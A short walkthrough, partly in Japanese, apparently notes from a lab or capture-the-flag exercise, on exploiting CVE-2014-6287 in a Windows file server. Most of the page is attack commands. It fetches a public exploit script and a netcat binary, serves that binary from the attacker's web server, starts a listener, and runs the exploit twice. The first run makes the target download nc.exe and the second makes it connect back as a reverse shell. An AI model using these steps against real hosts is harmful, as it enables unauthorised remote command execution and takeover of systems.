# CVE : 2014-6287 ([39161](https://www.exploit-db.com/exploits/39161))

You can execute arbitrary commands on the remote Windows host.

## 1. Download the python script to kali
```
wget https://www.exploit-db.com/raw/39161 -O /tmp/39161.py
```

## 2. Download netcat binary file.
39161.pyではあらかじめローカルIP、ポートを指定する必要あり。指定したアドレスから、netcatの実行可能ファイルをnc.exeという名前でダウンロードする仕様。そして、ダウンロードしたnc.exeを実行し、そのローカルIP、ポートにコネクトバックする（リバースシェル）

```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe -O ~/Downloads/steel/nc.exe
```

## 3. Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

## 4. Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

## 5. Execute script
The following command needs to be executed TWICE.
Download nc.exe first, and connects back to the listner on Kali second time. 
```
python 39161.py $rhost [RPORT]
```
